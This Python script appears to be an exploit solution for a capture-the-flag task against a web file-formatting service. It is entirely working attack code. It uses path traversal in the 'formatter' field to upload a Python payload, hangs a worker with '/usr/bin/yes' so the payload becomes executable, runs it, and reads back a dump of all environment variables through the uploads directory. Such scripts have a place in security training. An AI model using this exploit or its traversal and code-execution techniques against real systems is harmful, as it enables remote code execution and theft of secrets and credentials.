#!/usr/bin/env python3
import os
import sys

import requests

env_upload_name = os.urandom(20).hex()
payload = f"""#!/usr/bin/env python3
import json
import os
open('/app/uploads/{env_upload_name}','w').write(json.dumps(list(os.environ.items())))
"""


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} [TASK_URL]", file=sys.stderr)
        sys.exit(1)

    task_url = sys.argv[1]

    # use yaml as payload formatter so that our payloud isn't modified
    formatter = f"../../../formatters/{os.urandom(20).hex()}/../../app/formatters/yaml"

    print(f"Will upload payload with formatter {formatter}:\n{payload}")

    r = requests.post(
        f"{task_url}/format",
        files={"file": ("filename.json", payload.encode())},
        data={"formatter": formatter},
    )
    r.raise_for_status()

    payload_formatter_name = os.path.basename(r.json()["path"])
    print(f"Final payload formatter name: {payload_formatter_name}")

    # Timeout one worker so that it restarts and performs +x to our payload
    print(
        "Sending request with /usr/bin/yes formatter, will wait for ~30s until worker times out"
    )
    try:
        r = requests.post(
            f"{task_url}/format",
            files={"file": ("filename.json", "{}")},
            data={"formatter": "../../usr/bin/yes"},
        )
    except Exception as e:
        print(f"Got exception: {e}")

    print(f"Calling payload formatter {payload_formatter_name}")
    r = requests.post(
        f"{task_url}/format",
        files={"file": ("filename.json", "{}")},
        data={"formatter": payload_formatter_name},
    )

    print("Reading env leak through upload")
    r = requests.get(f"{task_url}/uploads/{env_upload_name}")
    print(r.text)


if __name__ == "__main__":
    main()
